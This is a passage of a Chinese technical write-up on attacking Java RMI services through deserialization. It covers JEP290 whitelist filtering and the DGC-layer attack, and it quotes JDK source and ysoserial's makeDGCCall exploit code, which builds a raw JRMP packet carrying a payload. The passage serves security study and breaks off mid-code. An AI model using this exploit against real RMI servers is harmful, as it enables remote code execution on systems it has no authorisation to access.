+        <span class="n">Class</span> <span class="n">var2</span> <span class="o">=</span> <span class="n">var0</span><span class="o">.</span><span class="na">serialClass</span><span class="o">();</span>
+        <span class="c1">//判断是否为null，null就报错</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">var2</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">Status</span><span class="o">.</span><span class="na">UNDECIDED</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="c1">//判断是否为数组类型</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">var2</span><span class="o">.</span><span class="na">isArray</span><span class="o">())</span> <span class="o">{</span>
+                <span class="c1">//数组长度大于10000就报错</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">var0</span><span class="o">.</span><span class="na">arrayLength</span><span class="o">()</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="n">L</span> <span class="o">&amp;&amp;</span> <span class="n">var0</span><span class="o">.</span><span class="na">arrayLength</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">10000L</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">return</span> <span class="n">Status</span><span class="o">.</span><span class="na">REJECTED</span><span class="o">;</span>
+                <span class="o">}</span>
+                <span class="c1">//获取到数组中的成分类，假如是还是数组嵌套，继续获取</span>
+                <span class="k">do</span> <span class="o">{</span>
+                    <span class="n">var2</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getComponentType</span><span class="o">();</span>
+                <span class="o">}</span> <span class="k">while</span><span class="o">(</span><span class="n">var2</span><span class="o">.</span><span class="na">isArray</span><span class="o">());</span>
+            <span class="o">}</span>
+            <span class="c1">//判断是不是JAVA基元类型，就是 绕过Object类型参数 小章中的那些基本类</span>
+            <span class="c1">//是基本类就允许</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">var2</span><span class="o">.</span><span class="na">isPrimitive</span><span class="o">())</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="n">Status</span><span class="o">.</span><span class="na">ALLOWED</span><span class="o">;</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="c1">//判断我们的输入的序列化类型是否为以下的几类class白名单之中</span>
+                <span class="c1">//如果我们输入的类属于下面这些白名单的类或超类，就返回ALLOWED</span>
+                <span class="c1">//不然就返回REJECTED报错。</span>
+                <span class="k">return</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span> <span class="o">!=</span> <span class="n">var2</span> <span class="o">&amp;&amp;</span> 
+                    <span class="o">!</span><span class="n">Number</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">var2</span><span class="o">)</span> <span class="o">&amp;&amp;</span> 
+                    <span class="o">!</span><span class="n">Remote</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">var2</span><span class="o">)</span> <span class="o">&amp;&amp;</span> 
+                    <span class="o">!</span><span class="n">Proxy</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">var2</span><span class="o">)</span> <span class="o">&amp;&amp;</span> 
+                    <span class="o">!</span><span class="n">UnicastRef</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">var2</span><span class="o">)</span> <span class="o">&amp;&amp;</span> 
+                    <span class="o">!</span><span class="n">RMIClientSocketFactory</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">var2</span><span class="o">)</span> <span class="o">&amp;&amp;</span> 
+                    <span class="o">!</span><span class="n">RMIServerSocketFactory</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">var2</span><span class="o">)</span> <span class="o">&amp;&amp;</span> 
+                    <span class="o">!</span><span class="n">ActivationID</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">var2</span><span class="o">)</span> <span class="o">&amp;&amp;</span> 
+                    <span class="o">!</span><span class="n">UID</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">var2</span><span class="o">)</span> <span class="o">?</span> 
+                    <span class="n">Status</span><span class="o">.</span><span class="na">REJECTED</span> <span class="o">:</span> <span class="n">Status</span><span class="o">.</span><span class="na">ALLOWED</span><span class="o">;</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p>但是我们发现我们传入的payload object是一个Remote.class接口呀，这样不是就是在白名单了么。</p>
+<p>实际上一开始是可以通过过滤器检测，但是readobject会把对象一层层递归拆开一个个经过过滤器检查，最后在<code>AnnotationInvocationHandler</code>处就被白名单拦下来了。</p>
+<p><a id="img26" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140223-f0a67e7e-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140223-f0a67e7e-b44d-1.png"></a></p>
+<p>也没有说有哪个链的payload刚好可以通过白名单，所以在JEP290之后对于注册端的攻击就被拦截了。</p>
+<h3 id="toc-13">注册端对于服务端地址校验的变动</h3>
+<p>在 RMI 反序列化一文中，我们有实验过：在默认情况下，服务端向注册端进行bind等操作，是会验证服务端地址是否被注册端允许的（默认是只信任本机地址）。</p>
+<p>但是我们在上面利用过程中，<strong>攻击者（服务端）都不是受害者（注册端）的信任地址，为何没有被这个验证机制所拦截呢？</strong></p>
+<p>原因是因为，这个<strong>注册端对于服务端的验证在反序列化操作之后</strong>：</p>
+<p>我们以8u112为例来看代码：</p>
+<p><a id="img27" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140237-f945bbbc-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140237-f945bbbc-b44d-1.png"></a></p>
+<p><code>sun.rmi.registry.RegistryImpl#bind</code>：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">bind</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">Remote</span> <span class="n">obj</span><span class="o">)</span>
+    <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">,</span> <span class="n">AlreadyBoundException</span><span class="o">,</span> <span class="n">AccessException</span>
+<span class="o">{</span>
+    <span class="c1">//此处验证</span>
+    <span class="n">checkAccess</span><span class="o">(</span><span class="s">"Registry.bind"</span><span class="o">);</span>
+    <span class="kd">synchronized</span> <span class="o">(</span><span class="n">bindings</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">Remote</span> <span class="n">curr</span> <span class="o">=</span> <span class="n">bindings</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">curr</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">AlreadyBoundException</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+        <span class="n">bindings</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">obj</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>在8u141之后，JDK代码对于此处验证逻辑发生了变化：变成<strong>先验证再反序列化操作</strong>了，等于服务端攻击注册端变为不可用。</p>
+<p>我们来看161与112的对比情况</p>
+<p><a id="img28" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140248-ffa63c34-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140248-ffa63c34-b44d-1.png"></a></p>
+<p>那么单单从验证服务端逻辑来说，8u141之后，服务端bind之类的打注册端变得不可利用。但是客户端lookup打注册端因为不需要验证，不受这个变动影响。</p>
+<p>但是对比上面的版本JEP290的封堵，自从8u121，客户端lookup打，服务单bind打就都不可利用了。这边的改动其实意义不大，但是还是之前注意到过，领出来提一下。</p>
+<blockquote><p>但是假如可以JEP290绕过了，这里就变得非常有意思了，8u141之后lookup可以利用，bind不能利用。</p>
+</blockquote>
+<h2 id="toc-14">RMI DGC层反序列化</h2>
+<blockquote><p>网上的文章讲到RMI的DGC层，经常总结说到：是为了绕过RMI注册端jdk8u121后出现的白名单限制才出现的。</p>
+<p>这也是对的，但是也不是完全对。一开始我也是因为ysoserial中的exploit模块和payload模块弄混了搞不清楚。在开始前我们需要区分：</p>
+<p>ysoserial的payload JRMPClient 是为了绕过jdk8u121后出现的白名单限制。这利用到了DGC层，所以上面句话也是对的。</p>
+<p>ysoserial的exploit JRMPClient 是可以直接利用DGC层攻击RMI注册端的，其基础原理跟ysoserial-RMIRegistryExploit几乎是一样的。同时这种攻击方式是绕过不过jdk8u121的。</p>
+<p>我们接下来讲到的是 ysoserial的exploit JRMPClient。而payload JRMPClient与绕过jdk8u121将在下篇说到。</p>
+</blockquote>
+<h3 id="toc-15">DGC客户端打DGC服务端</h3>
+<p>我们先来看与Bind攻击类似的另外一条更为底层的攻击路径：ysoserial的exploit JRMPClient 。</p>
+<p>先来演示下攻击效果：依旧是8u111的ServerAndRegister起服务端 ，客户端使用yso的exploit JRMPClient 模块</p>
+<p><a id="img29" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140305-0a353934-b44e-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140305-0a353934-b44e-1.png"></a></p>
+<p><a id="img30" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140314-0f5f426a-b44e-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140314-0f5f426a-b44e-1.png"></a></p>
+<p>可以攻击成功。</p>
+<p>那么回过头来看看原理：<a href="https://www.apiref.com/java11-zh/java.rmi/java/rmi/dgc/DGC.html" target="_blank">DGC（Distributed Garbage Collection）——分布式垃圾回收机制</a>。</p>
+<p>这个DGC是用于<strong>维护服务端中被客户端使用的远程引用才存在的</strong>。其中包括两个方法<strong>dirty</strong>和<strong>clean</strong>，简单来说：</p>
+<ul>
+<li>客户端想要使用服务端上的远程引用，使用dirty方法来注册一个。同时这还跟租房子一样，过段时间继续用的话还要再调用一次来续租。</li>
+<li>客户端不使用的时候，需要调用clean方法来清楚这个远程引用。</li>
+</ul>
+<p>由于我们的RMI服务就是基于远程引用的，其底层的远程引用维护就是就是使用DGC，起一个RMI服务必有DGC层。于是我们就打这个DGC服务。</p>
+<blockquote><p>相对于RMIRegistryExploit模块，这个模块攻击范围更广因为RMI服务端或者RMI注册端都会开启DGC服务端。</p>
+</blockquote>
+<p>看看DGC服务端最后是哪里触发了反序列化执行：<code>sun.rmi.transport.DGCImpl_Skel#dispatch</code></p>
+<p>（跟<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>）极其类似</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">dispatch</span><span class="o">(</span><span class="n">Remote</span> <span class="n">var1</span><span class="o">,</span> <span class="n">RemoteCall</span> <span class="n">var2</span><span class="o">,</span> <span class="kt">int</span> <span class="n">var3</span><span class="o">,</span> <span class="kt">long</span> <span class="n">var4</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+    <span class="c1">//一样是一个dispatch用于分发作用的方法</span>
+    <span class="c1">//固定接口hash校验</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">var4</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">669196253586618813L</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="n">SkeletonMismatchException</span><span class="o">(</span><span class="s">"interface hash mismatch"</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="n">DGCImpl</span> <span class="n">var6</span> <span class="o">=</span> <span class="o">(</span><span class="n">DGCImpl</span><span class="o">)</span><span class="n">var1</span><span class="o">;</span>
+        <span class="n">ObjID</span><span class="o">[]</span> <span class="n">var7</span><span class="o">;</span>
+        <span class="kt">long</span> <span class="n">var8</span><span class="o">;</span>
+        <span class="c1">//判断dirty和clean分支流</span>
+        <span class="k">switch</span><span class="o">(</span><span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
+            <span class="c1">//clean分支流</span>
+            <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
+                <span class="n">VMID</span> <span class="n">var39</span><span class="o">;</span>
+                <span class="kt">boolean</span> <span class="n">var40</span><span class="o">;</span>
+                <span class="k">try</span> <span class="o">{</span>
+                    <span class="c1">//从客户端提供的输入流取值</span>
+                    <span class="n">ObjectInput</span> <span class="n">var14</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+                    <span class="c1">//对于取值进行反序列化，***漏洞触发点***</span>
+                    <span class="n">var7</span> <span class="o">=</span> <span class="o">(</span><span class="n">ObjID</span><span class="o">[])</span><span class="n">var14</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                    <span class="n">var8</span> <span class="o">=</span> <span class="n">var14</span><span class="o">.</span><span class="na">readLong</span><span class="o">();</span>
+                    <span class="n">var39</span> <span class="o">=</span> <span class="o">(</span><span class="n">VMID</span><span class="o">)</span><span class="n">var14</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                    <span class="n">var40</span> <span class="o">=</span> <span class="n">var14</span><span class="o">.</span><span class="na">readBoolean</span><span class="o">();</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var36</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var36</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">var37</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var37</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+                    <span class="n">var2</span><span class="o">.</span><span class="na">releaseInputStream</span><span class="o">();</span>
+                <span class="o">}</span>
+              <span class="c1">//进行clean操作，已经完成了攻击，之后操作已经不重要了。</span>
+                <span class="n">var6</span><span class="o">.</span><span class="na">clean</span><span class="o">(</span><span class="n">var7</span><span class="o">,</span> <span class="n">var8</span><span class="o">,</span> <span class="n">var39</span><span class="o">,</span> <span class="n">var40</span><span class="o">);</span>
+
+                <span class="c1">//..省略部分无关操作</span>
+            <span class="c1">//dirty方法分支流，跟clean在漏洞触发点上是一样没差的</span>
+            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+                <span class="n">Lease</span> <span class="n">var10</span><span class="o">;</span>
+                <span class="k">try</span> <span class="o">{</span>
+                    <span class="c1">//从客户端提供的输入流取值</span>
+                    <span class="n">ObjectInput</span> <span class="n">var13</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+                    <span class="c1">//对于取值进行反序列化，***漏洞触发点***</span>
+                    <span class="n">var7</span> <span class="o">=</span> <span class="o">(</span><span class="n">ObjID</span><span class="o">[])</span><span class="n">var13</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                    <span class="n">var8</span> <span class="o">=</span> <span class="n">var13</span><span class="o">.</span><span class="na">readLong</span><span class="o">();</span>
+                    <span class="n">var10</span> <span class="o">=</span> <span class="o">(</span><span class="n">Lease</span><span class="o">)</span><span class="n">var13</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var32</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var32</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">var33</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var33</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+                    <span class="n">var2</span><span class="o">.</span><span class="na">releaseInputStream</span><span class="o">();</span>
+                <span class="o">}</span>
+
+                <span class="n">Lease</span> <span class="n">var11</span> <span class="o">=</span> <span class="n">var6</span><span class="o">.</span><span class="na">dirty</span><span class="o">(</span><span class="n">var7</span><span class="o">,</span> <span class="n">var8</span><span class="o">,</span> <span class="n">var10</span><span class="o">);</span>
+
+               <span class="c1">//..省略无关操作</span>
+            <span class="k">default</span><span class="o">:</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"invalid method number"</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p>一致的漏洞触发点，没问题。可以看到这里触发点的话无论是选dirty那条线还是clean那条线都是一样的。</p>
+<p>那客户端怎样与服务端通讯呢，之前RMIRegistryExploit是<code>bind（name,payload）</code>这里插入payload，然后传输到服务端。</p>
+<p><strong>DGC这里我们客户端在哪里可以插入payload？</strong></p>
+<p>此处我自己并没有找到一个与<code>bind()</code>类似的封装好的方法，可以方便我们调试的直接发起一个DGC层的请求。但是我们在<code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code>处下一个断点，然后在<code>sun.rmi.transport.DGCImpl#dirty</code>下一个断点，调试github上的ServerAndRegister.java就可以得到这个DGC层的通讯客户端-服务端的过程（是在bind()绑定对象的时候产生的通讯）</p>
+<blockquote><p>跟RMI-register这些一样，DGCImpl_Skel是服务端代码，DGCImpl_Stub是客户端代码；但是这两个class也跟我们之前说的一样（动态生成？），总之是无法下断点调试的。所以在其内部调用的其他方法下断点来调试。</p>
+<p>然后感谢<a href="https://www.anquanke.com/post/id/204740" target="_blank">这个老哥</a>给了个例子，客户端lookup也会产生DGC通讯。（其实大多操作都会有DGC，这里抄一下放在github中嘿嘿）但是仍然先来看ServerAndRegister.java的通讯</p>
+</blockquote>
+<p>DGC客户端处：</p>
+<p><a id="img31" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140338-1dd087b4-b44e-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140338-1dd087b4-b44e-1.png"></a></p>
+<p>DGC服务端处：</p>
+<p><a id="img32" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140349-24520c48-b44e-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140349-24520c48-b44e-1.png"></a></p>
+<p>根据客户端调用栈来回退到<code>DGCImpl_Stub</code>的<code>dirty</code>方法，去看应该在哪里插入payload（clean其实也一样）就看<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>好了</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Lease</span> <span class="nf">dirty</span><span class="o">(</span><span class="n">ObjID</span><span class="o">[]</span> <span class="n">var1</span><span class="o">,</span> <span class="kt">long</span> <span class="n">var2</span><span class="o">,</span> <span class="n">Lease</span> <span class="n">var4</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//开启了一个连接，似曾相识的 669196253586618813L 在服务端也有</span>
+            <span class="n">RemoteCall</span> <span class="n">var5</span> <span class="o">=</span> <span class="kd">super</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">newCall</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">operations</span><span class="o">,</span> <span class="mi">1</span><span class="o">,</span> <span class="o">-</span><span class="mi">669196253586618813L</span><span class="o">);</span>
+
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="c1">//获取连接的输入流</span>
+                <span class="n">ObjectOutput</span> <span class="n">var6</span> <span class="o">=</span> <span class="n">var5</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span>
+                <span class="c1">//写入一个对象，在实现的本意中，这里是一个ID的对象列表ObjID[]</span>
+                <span class="c1">//***这里就是我们payload写入的地方***</span>
+                <span class="n">var6</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
+                <span class="c1">//------</span>
+                <span class="n">var6</span><span class="o">.</span><span class="na">writeLong</span><span class="o">(</span><span class="n">var2</span><span class="o">);</span>
+                <span class="n">var6</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">var4</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var20</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">MarshalException</span><span class="o">(</span><span class="s">"error marshalling arguments"</span><span class="o">,</span> <span class="n">var20</span><span class="o">);</span>
+            <span class="o">}</span>
+
+            <span class="kd">super</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">var5</span><span class="o">);</span>
+
+            <span class="n">Lease</span> <span class="n">var24</span><span class="o">;</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">ObjectInput</span> <span class="n">var9</span> <span class="o">=</span> <span class="n">var5</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+                <span class="n">var24</span> <span class="o">=</span> <span class="o">(</span><span class="n">Lease</span><span class="o">)</span><span class="n">var9</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+            <span class="c1">//省略大量错误处理..</span>
+    <span class="o">}</span>
+</pre></div>
+<p>这里我们就找到了DGC客户端该放payload的地方，和DGC服务端触发反序列化的地方。</p>
+<p>接下就是去实现一个POC，把payload放进去。可以发现我们去寻找的DGC客户端该放payload的地方调用栈很深，这代表着我们从顶层开始传输payload一直到我们想要放置payload的参数，payload不变可能性极低或难度极大。所以针对这种很底层的payload的poc构建通常使用自实现一个客户端去拼接序列化数据包。</p>
+<p>Ysoserial的JRMP-Client exploit模块就是这么实现的，其核心在于<code>makeDGCCall</code>方法：</p>
+<div class="highlight"><pre><span></span><span class="c1">//传入目标RMI注册端（也是DGC服务端）的IP端口，以及攻击载荷的payload对象。</span>
+<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">makeDGCCall</span> <span class="o">(</span> <span class="n">String</span> <span class="n">hostname</span><span class="o">,</span> <span class="kt">int</span> <span class="n">port</span><span class="o">,</span> <span class="n">Object</span> <span class="n">payloadObject</span> <span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">UnknownHostException</span><span class="o">,</span> <span class="n">SocketException</span> <span class="o">{</span>
+        <span class="n">InetSocketAddress</span> <span class="n">isa</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InetSocketAddress</span><span class="o">(</span><span class="n">hostname</span><span class="o">,</span> <span class="n">port</span><span class="o">);</span>
+        <span class="n">Socket</span> <span class="n">s</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="n">DataOutputStream</span> <span class="n">dos</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//建立一个socket通道，并为赋值</span>
+            <span class="n">s</span> <span class="o">=</span> <span class="n">SocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">().</span><span class="na">createSocket</span><span class="o">(</span><span class="n">hostname</span><span class="o">,</span> <span class="n">port</span><span class="o">);</span>
+            <span class="n">s</span><span class="o">.</span><span class="na">setKeepAlive</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">s</span><span class="o">.</span><span class="na">setTcpNoDelay</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+           <span class="c1">//读取socket通道的数据流</span>
+            <span class="n">OutputStream</span> <span class="n">os</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span>
+            <span class="n">dos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DataOutputStream</span><span class="o">(</span><span class="n">os</span><span class="o">);</span>
+           <span class="c1">//*******开始拼接数据流*********</span>
+            <span class="c1">//以下均为特定协议格式常量，之后会说到这些数据是怎么来的</span>
+            <span class="c1">//传输魔术字符：0x4a524d49（代表协议）</span>
+            <span class="n">dos</span><span class="o">.</span><span class="na">writeInt</span><span class="o">(</span><span class="n">TransportConstants</span><span class="o">.</span><span class="na">Magic</span><span class="o">);</span>
+            <span class="c1">//传输协议版本号：2（就是版本号）</span>
+            <span class="n">dos</span><span class="o">.</span><span class="na">writeShort</span><span class="o">(</span><span class="n">TransportConstants</span><span class="o">.</span><span class="na">Version</span><span class="o">);</span>
+            <span class="c1">//传输协议类型: 0x4c (协议的种类，好像是单向传输数据，不需要TCP的ACK确认)</span>
+            <span class="n">dos</span><span class="o">.</span><span class="na">writeByte</span><span class="o">(</span><span class="n">TransportConstants</span><span class="o">.</span><span class="na">SingleOpProtocol</span><span class="o">);</span>
+           <span class="c1">//传输指令-RMI call：0x50 </span>
+            <span class="n">dos</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">TransportConstants</span><span class="o">.</span><span class="na">Call</span><span class="o">);</span>
+
+            <span class="nd">@SuppressWarnings</span> <span class="o">(</span> <span class="s">"resource"</span> <span class="o">)</span>
+            <span class="kd">final</span> <span class="n">ObjectOutputStream</span> <span class="n">objOut</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MarshalOutputStream</span><span class="o">(</span><span class="n">dos</span><span class="o">);</span>
+           <span class="c1">//DGC的固定读取格式，等会具体分析</span>
+            <span class="n">objOut</span><span class="o">.</span><span class="na">writeLong</span><span class="o">(</span><span class="mi">2</span><span class="o">);</span> <span class="c1">// DGC</span>
+            <span class="n">objOut</span><span class="o">.</span><span class="na">writeInt</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
+            <span class="n">objOut</span><span class="o">.</span><span class="na">writeLong</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
+            <span class="n">objOut</span><span class="o">.</span><span class="na">writeShort</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
+           <span class="c1">//选取DGC服务端的分支选dirty</span>
+            <span class="n">objOut</span><span class="o">.</span><span class="na">writeInt</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span> <span class="c1">// dirty</span>
+            <span class="c1">//然后一个固定的hash值</span>
+            <span class="n">objOut</span><span class="o">.</span><span class="na">writeLong</span><span class="o">(-</span><span class="mi">669196253586618813L</span><span class="o">);</span>
+            <span class="c1">//我们的反序列化触发点</span>
+            <span class="n">objOut</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">payloadObject</span><span class="o">);</span>
+
+            <span class="n">os</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p>简单分析了一下POC数据包的构成，但是还是尝试搞清楚为什么是这个拼接顺序，为什么要这个值，感觉好玩一些。</p>
+<p>我们可以通过在DGC服务端，CC链最终的触发处<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>处下一个断点，然后客户端使用YSO的exploit JRMPClient攻击服务端，从而得到受攻击服务端的调用栈，然后再回过头分析。</p>
+<p>可以得到下面调用栈，在1-5的地方均有POC生成序列化数据必须满足的条件。</p>
+<p><a id="img33" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140411-31267968-b44e-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140411-31267968-b44e-1.png"></a></p>
+<p>具体的因为好玩画了一张POC与服务端解析位置一一对应的图，图中有具体的反序列化点的方法以及行数同时用Qx来做了对应。（呼，1个小时作图..真爽，协议可以参考<a href="https://docs.oracle.com/javase/8/docs/platform/rmi/spec/rmi-protocol3.html" target="_blank">官方文档</a>）</p>
+<p><a id="img34" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140434-3edd6486-b44e-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140434-3edd6486-b44e-1.png"></a></p>
+<p>payload触发点没有在上面的图上，因为之前刚分析过了在<code>sun.rmi.transport.DGCImpl_Skel#dispatch</code>，这里没放进去。</p>
+<p>此外DGC固定读取格式也是固定的，在<code>sun.rmi.transport.Transport#serviceCall</code>读取了参数之后进行了校验</p>
+<div class="highlight"><pre><span></span><span class="k">try</span> <span class="o">{</span>
+     <span class="n">id</span> <span class="o">=</span> <span class="n">ObjID</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">call</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">());</span>
+ <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+     <span class="k">throw</span> <span class="k">new</span> <span class="n">MarshalException</span><span class="o">(</span><span class="s">"unable to read objID"</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
